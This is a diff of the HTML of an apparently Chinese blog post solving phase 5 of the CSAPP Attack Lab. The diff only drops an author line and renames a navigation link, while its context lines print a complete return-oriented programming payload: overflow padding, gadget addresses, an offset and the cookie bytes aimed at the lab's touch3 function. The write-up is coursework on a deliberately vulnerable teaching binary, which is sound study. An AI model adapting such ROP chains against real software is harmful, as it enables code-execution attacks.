@@ -442,7 +442,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line">movq %rsp,%rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">popq %rax</span><br><span class="line">这里是一个offset</span><br><span class="line">movl %rax,%rdx</span><br><span class="line">movl %rdx,%rcx</span><br><span class="line">movl %rcx,%rsi</span><br><span class="line">lea (%rdi,%rsi,1),%rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">字符串</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 // 溢出</span><br><span class="line">06 1a 40 00 00 00 00 00 // movq %rsp,%rax</span><br><span class="line">a2 19 40 00 00 00 00 00 // movq %rax,%rdi</span><br><span class="line">ab 19 40 00 00 00 00 00 // popq %rax</span><br><span class="line">48 00 00 00 00 00 00 00 // 0x48 = 72 共有 9 条指令，每条 8 个 Byte</span><br><span class="line">dd 19 40 00 00 00 00 00 // movl %rax,%rdx</span><br><span class="line">69 1a 40 00 00 00 00 00 // movl %rdx,%rcx</span><br><span class="line">13 1a 40 00 00 00 00 00 // movl %rcx,%rsi</span><br><span class="line">d6 19 40 00 00 00 00 00 // lea (%rdi,%rsi,1),%rax</span><br><span class="line">c5 19 40 00 00 00 00 00 // movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00 // touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 // cookie</span><br></pre></td></tr></table></figure>
 <p>终于搞定，计算机器语言的偏移量真不容易，还是高级语言舒服啊…</p>
-<p><strong>本文作者</strong>：Steve<br><strong>本文地址</strong>： <a href="http://lyh.moe/2019/01/04/CSAPP-Lab-III-Attack-Lab/">http://lyh.moe/2019/01/04/CSAPP-Lab-III-Attack-Lab/</a> <br><strong>联系我</strong>： <a href="mailto:lyh@lyh.moe">lyh@lyh.moe</a></p>
       
     </div>
 
@@ -492,8 +491,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/01/26/CSAPP-Lab-IV-Cache-Lab/" rel="prev" title="CSAPP-Lab-IV-Cache-Lab">
-                CSAPP-Lab-IV-Cache-Lab <i class="fa fa-chevron-right"></i>
+              <a href="/2019/01/26/CSAPP-Lab-IV-Cache-Lab/" rel="prev" title="[CSAPP Lab]-IV Cache Lab">
+                [CSAPP Lab]-IV Cache Lab <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
